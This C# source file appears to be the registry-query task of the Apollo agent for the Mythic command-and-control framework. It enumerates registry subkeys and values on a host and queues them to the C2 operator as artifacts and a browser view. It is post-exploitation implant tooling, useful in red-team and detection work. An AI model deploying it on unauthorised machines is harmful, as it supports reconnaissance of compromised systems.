#define COMMAND_NAME_UPPER

#if DEBUG
#define REG_QUERY
#endif

#if REG_QUERY

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Utils;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;

namespace Tasks
{
    public class reg_query : Tasking
    {
        [DataContract]
        internal struct RegQueryParameters
        {
            [DataMember(Name = "hive")]
            public string Hive;
            [DataMember(Name = "key")]
            public string Key;
        }
        [DataContract]
        internal struct RegQueryResult
        {
            [DataMember(Name = "hive")]
            public string Hive;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "full_name")]
            public string FullName;
            [DataMember(Name = "value")]
            public string Value;
            [DataMember(Name = "value_type")]
            public string Type;
            [DataMember(Name = "result_type")]
            public string ResultType;
        }
        public reg_query(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        private static string[] GetValueNames(string hive, string subkey)
        {
            using (RegistryKey regKey = RegistryUtils.GetRegistryKey(hive, subkey, false))
            {
                return regKey.GetValueNames();
            }
        }

        private static object GetValue(string hive, string subkey, string key)
        {
            using (RegistryKey regKey = RegistryUtils.GetRegistryKey(hive, subkey, false))
            {
                return regKey.GetValue(key);
            }
        }
        private static string GetType(string hive, string subkey, string key)
        {
            using (RegistryKey regKey = RegistryUtils.GetRegistryKey(hive, subkey, false))
            {
                RegistryValueKind kind = regKey.GetValueKind(key);
                switch (kind)
                {
                    case RegistryValueKind.None:
                    {
                        return "None";
                    }
                    case RegistryValueKind.Unknown:
                        return "Unknown";
                    case RegistryValueKind.String:
                        return "REG_SZ";
                    case RegistryValueKind.ExpandString:
                        return "REG_EXPAND_SZ";
                    case RegistryValueKind.Binary:
                        return "REG_BINARY";
                    case RegistryValueKind.DWord:
                        return "REG_DWORD";
                    case RegistryValueKind.MultiString:
                        return "REG_MULTI_SZ";
                    case RegistryValueKind.QWord:
                        return "REG_QWORD";
                    default:
                        return "Unknown Registry Type";
                }
            }
        }

        private static string[] GetSubKeys(string hive, string subkey)
        {
            using (RegistryKey regKey = RegistryUtils.GetRegistryKey(hive, subkey, false))
            {
                return regKey.GetSubKeyNames();
            }
        }

        private void SetValueType(object tmpVal, ref RegQueryResult res)
        {

            if (tmpVal is String)
            {
                res.Value = tmpVal.ToString();
            }
            else if (tmpVal is int)
            {
                res.Value = tmpVal.ToString();
            }
            else if (tmpVal is byte[])
            {
                res.Value = BitConverter.ToString((byte[])tmpVal);
            }
            else if (tmpVal is null)
            {
                res.Value = "(value not set)";
                res.Type = "null";
            }
            else if(tmpVal is System.String[])
            {
                res.Value = string.Join("\n", tmpVal);
            }
            else
            {
                res.Value = tmpVal.ToString();
            }
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            RegQueryParameters parameters = _jsonSerializer.Deserialize<RegQueryParameters>(_data.Parameters);
            List<RegQueryResult> results = new List<RegQueryResult>();
            List<IMythicMessage> artifacts = new List<IMythicMessage>();
            string error = "";
            CustomBrowser customBrowser = new CustomBrowser();
            customBrowser.BrowserName = "registry_browser";
            customBrowser.SetAsUserOutput = true;
            customBrowser.Host = Environment.GetEnvironmentVariable("COMPUTERNAME");
            customBrowser.Entries = new List<CustomBrowserEntry>();
            CustomBrowserEntry customBrowserEntry = new CustomBrowserEntry();
            customBrowserEntry.Children = new List<CustomBrowserEntryChild>();
            try
            {
                string[] subkeys = GetSubKeys(parameters.Hive, parameters.Key);
                customBrowserEntry.CanHaveChildren = true;
                if (parameters.Key.Length > 0)
                {
                    string[] keyPieces = parameters.Key.Split('\\');
                    if (keyPieces[keyPieces.Length - 1] == "")
                    {
                        keyPieces = keyPieces.Skip(0).Take(keyPieces.Length - 1).ToArray();
                    }

                    customBrowserEntry.Name = keyPieces[keyPieces.Length -1];
                    keyPieces = keyPieces.Skip(0).Take(keyPieces.Length - 1).ToArray();
                    if(keyPieces.Length > 0)
                    {
                        customBrowserEntry.ParentPath = $"{parameters.Hive}\\{string.Join("\\", keyPieces)}";
                    } else
                    {
                        customBrowserEntry.ParentPath = $"{parameters.Hive}";
                    }

                }
                else
                {
                    customBrowserEntry.Name = parameters.Hive;
                    customBrowserEntry.ParentPath = "";
                }
                customBrowserEntry.Success = true;
                artifacts.Add(Artifact.RegistryRead(parameters.Hive, parameters.Key));
                foreach (string subkey in subkeys)
                {
                    results.Add(new RegQueryResult
                    {
                        Name = subkey,
                        FullName = parameters.Key.EndsWith("\\") ? $"{parameters.Key}{subkey}" : $"{parameters.Key}\\{subkey}",
                        Hive = parameters.Hive,
                        ResultType = "key"
                    });
                    customBrowserEntry.Children.Add(new CustomBrowserEntryChild
                    {
                        CanHaveChildren = true,
                        Name = subkey,
                        Metadata = new Dictionary<string, object>
                        {
                            { "type", "key" },
                            { "value", "" },
                        },
                    });
                }
            }
            catch (Exception ex)
            {
                error = ex.Message;
                customBrowserEntry.Success = false;
            }

            try
            {
                object tmpVal;
                string[] subValNames = GetValueNames(parameters.Hive, parameters.Key);
                foreach (string valName in subValNames)
                {
                    RegQueryResult res = new RegQueryResult
                    {
                        Name = valName,
                        FullName = parameters.Key,
                        Hive = parameters.Hive,
                        ResultType = "value"
                    };
                    try
                    {
                        tmpVal = GetValue(parameters.Hive, parameters.Key, valName);
                    }
                    catch (Exception ex)
                    {
                        tmpVal = ex.Message;
                    }

                    SetValueType(tmpVal, ref res);
                    res.ResultType = GetType(parameters.Hive, parameters.Key, valName);
                    results.Add(res);
                    customBrowserEntry.Children.Add(new CustomBrowserEntryChild
                    {
                        CanHaveChildren = false,
                        Name = valName == "" ? "(Default)" : valName,
                        Metadata = new Dictionary<string, object>
                        {
                            { "type", GetType(parameters.Hive, parameters.Key, valName) },
                            { "value", res.Value },
                        },
                    });
                    artifacts.Add(Artifact.RegistryRead(parameters.Hive, $"{parameters.Key} {valName}"));
                }
            }
            catch (Exception ex)
            {
                error += $"\n{ex.Message}";
            }
            customBrowser.Entries.Add(customBrowserEntry);
            if (results.Count == 0)
            {
                resp = CreateTaskResponse(error, true, "error", artifacts.ToArray());
            }
            else
            {
                resp = CreateTaskResponse("", true, "completed", artifacts.ToArray());
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                "", false, "", new IMythicMessage[]
                {
                    customBrowser
                }));
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);

        }
    }
}

#endif